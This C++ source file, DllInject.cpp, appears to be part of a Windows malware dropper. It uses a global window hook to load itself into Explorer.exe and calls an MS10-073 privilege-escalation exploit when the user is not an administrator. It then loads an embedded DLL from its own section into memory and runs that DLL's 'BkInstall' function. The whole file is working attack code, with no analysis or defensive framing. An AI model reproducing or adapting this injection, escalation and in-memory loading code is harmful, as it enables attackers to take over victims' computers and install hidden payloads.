// DllInject.cpp : Defines the exported functions for the DLL application.
//

#include "windows.h"
#include "Memory.h"
#include "DllLoader.h"
#include "ms10_073\ms10_073.h"
#include <shlobj.h>
#include "..\dllloader\getsec.h"

#define EXPORT_API __declspec(dllexport)

//namespace DllIn
//{
//	#include "DllIn.h"
//}

#pragma data_seg (".shared")
char nameDllInject[MAX_PATH] = { 0 };
char nameExe[MAX_PATH] = { 0 };
char runFunc[64] = { 0 };
int injectGood = 0; // = 2 - ��������� ������ �������
#pragma data_seg()
#pragma comment(linker, "/section:.shared,RWS")
HMODULE currHDLL; //���������� ���, ����� ��� ���������� ���� � ���

void InjectFromHookDll()
{
	char buf[MAX_PATH];
	HMODULE mdl = GetModuleHandle(0);
	int ln = GetModuleFileName( mdl, buf, sizeof(buf) );
	//Explorer.exe
	char* p = buf + ln - 1;
	while( *p != '\\' && *p != '/' ) *p-- |= 0x20;
	p++;
	//OutputDebugString(p);
	if( p[0] == 'e'  && p[3] == 'l' && p[6] == 'e' && p[9] == 'e' )
	{
		//OutputDebugString(p);
		if( injectGood == 0 )
		{
			injectGood++;
			HMODULE dll = (HMODULE)LoadLibraryA(nameDllInject);
			if( dll )
			{
				LPTHREAD_START_ROUTINE func = (LPTHREAD_START_ROUTINE)GetProcAddress( dll, runFunc );
				if( func )
				{
					HANDLE hThread = CreateThread( NULL, 0, func, dll, 0, NULL );
					CloseHandle(hThread);
					injectGood++;
				}
				else
				{
					FreeLibrary(dll);
					injectGood = 0;
				}
			}
			else
				injectGood = 0;
		}
	}
}

//typedef int (WINAPI *funcStart)(char*, int);
typedef ULONG (WINAPI *funcStart)();
const char* nameFuncStart = "BkInstall";

bool RunDllCrossMemory(char* nameExe, int privelege)
{
	bool ret = false;
	char* data;
	DWORD szData;
	GetSectionConfigData(currHDLL, (PVOID*)&data, &szData );
	int szDll = *((int*)data);

	LPBYTE dllFile = (LPBYTE)MemAlloc(szDll + 1);
	for(;;) 
	{
		if( dllFile == 0 ) break;
		m_memcpy( dllFile, data + sizeof(int), szDll );
		HMEMORYMODULE hDll = MemoryLoadLibrary(dllFile);
		if( hDll == 0 )	break;
		funcStart func = (funcStart)MemoryGetProcAddress( hDll, nameFuncStart );
		if( func != 0 )
			//if( func(nameExe, privelege) != 0 )
			if( func() )
				ret = true;
		MemoryFreeLibrary(hDll);
		MemFree(dllFile);
		break;
	}
	return ret;
}

bool RunDllCrossFile(char* nameExe, int privelege)
{
	char path[MAX_PATH], name_dll[MAX_PATH];
	bool ret = false;
	char* data;
	DWORD szData;
	GetSectionConfigData(currHDLL, (PVOID*)&data, &szData );
	int szDll = *((int*)data);

	GetModuleFileName(0, nameExe, sizeof(nameExe));
	GetTempPath( MAX_PATH, path );
	GetTempFileName( path, 0, 0, name_dll );
	HANDLE fout = CreateFile( name_dll, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	DWORD rl;
	WriteFile( fout, data + sizeof(int), szData, &rl, 0 );
	CloseHandle(fout);
 
	//OutputDebugString(name_dll);
	HMODULE hDll = LoadLibrary(name_dll);
	if( hDll == 0 )	return ret;
	funcStart func = (funcStart)GetProcAddress( hDll, nameFuncStart );
	if( func != 0 ) 
	{
		//if( func(nameExe, privelege) != 0 )
		if( func() )
			ret = true;
	}
	FreeLibrary(hDll);
	return ret;
}

extern "C" {

LRESULT EXPORT_API CALLBACK FilterCallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
 return CallNextHookEx( 0, nCode, wParam, lParam );
}

bool EXPORT_API __stdcall InjectIntoExplorerThroughHook(char* exe, char* dll, char* func)
{
	char dllHook[MAX_PATH];
	GetModuleFileName( currHDLL, dllHook, sizeof(dllHook) );
	if( dll == 0 )
	{
		lstrcpy( nameDllInject, dllHook );
	}
	else
		lstrcpy( nameDllInject, dll );
	lstrcpy( nameExe, exe );
	lstrcpy( runFunc, func );
	injectGood = 0;
	HHOOK hook = SetWindowsHookEx( WH_CALLWNDPROC, FilterCallWndProc, currHDLL, 0 ); //������ ���
	if( hook )
	{
		//���� ���� ���������, �� ������ 10 ������
		for( int i = 0; i < 100; i++ )
		{
			if( injectGood == 2 ) break;
			Sleep(100);
		}
		UnhookWindowsHookEx(hook); //������� ���
	}
	return injectGood == 2 ? true : false;;
}

void PrivelegesToDebug()
{
 HANDLE hToken;
 LUID setcbnameValue;
 TOKEN_PRIVILEGES tkp;
 DWORD errcod;
 LPVOID lpMsgBuf;
 LPCTSTR msgptr;

 UCHAR InfoBuffer[1000];
 PTOKEN_PRIVILEGES ptgPrivileges = (PTOKEN_PRIVILEGES) InfoBuffer;
 DWORD dwInfoBufferSize;
 DWORD dwPrivilegeNameSize;
 DWORD dwDisplayNameSize;
 UCHAR ucPrivilegeName[500];
 UCHAR ucDisplayName[500];
 DWORD dwLangId;
 UINT i;

 if ( ! OpenProcessToken( GetCurrentProcess(),
  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
 {
  return;
 }

 // ---------------------------------------------------------------------
 // enumerate currently held privs (NOTE: not *enabled* privs, just the
 // ones you _could_ enable as in the last part)

 GetTokenInformation( hToken, TokenPrivileges, InfoBuffer,
  sizeof(InfoBuffer), &dwInfoBufferSize);

 for( i = 0; i < ptgPrivileges->PrivilegeCount; i ++ )
 {
  dwPrivilegeNameSize = sizeof(ucPrivilegeName);
  dwDisplayNameSize = sizeof(ucDisplayName);
  LookupPrivilegeName( NULL, &ptgPrivileges->Privileges[i].Luid,
   (char*)ucPrivilegeName, &dwPrivilegeNameSize );
  LookupPrivilegeDisplayName( NULL, (char*)ucPrivilegeName,
   (char*)ucDisplayName, &dwDisplayNameSize, &dwLangId );
  char buf[128];
  wsprintf( buf, "%40s (%s)\n", ucDisplayName, ucPrivilegeName );
  OutputDebugString(buf);
 }
 return;
}

void EXPORT_API __stdcall RunOtherDll(HMODULE hdll)
{
	int admin = 0;
	if( IsUserAnAdmin() )
	{
		//OutputDebugString("Current user is admin");
		admin = 1;
	}
	else
	{
		if( ExploitMS10_073() )
		{
			//OutputDebugString("MS10_073 TRUE");
			admin = 2;
		}
		else
			OutputDebugString("MS10_073 FALSE");
	}
	RunDllCrossMemory(nameExe, admin);
/*
	//if( RunDllCrossMemory(nameExe, admin) )
	if( RunDllCrossFile(nameExe, admin) )
		OutputDebugString("AutoRun TRUE");
	else
		OutputDebugString("AutoRun FALSE");
*/
	FreeLibrary(hdll);
}

void EXPORT_API __stdcall Test()
{
	MessageBox( 0, "Test", "!!!", 0 );
}

BOOL EXPORT_API __stdcall DllMain( HINSTANCE hDLL, DWORD fdwReason, LPVOID )
{
	HMODULE mdl;
	switch( fdwReason ) {
		case DLL_PROCESS_ATTACH:
			currHDLL = hDLL;
		case DLL_THREAD_ATTACH:
			InjectFromHookDll();
			return TRUE;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_DETACH:
			return TRUE;
	}
	return TRUE;
}

}
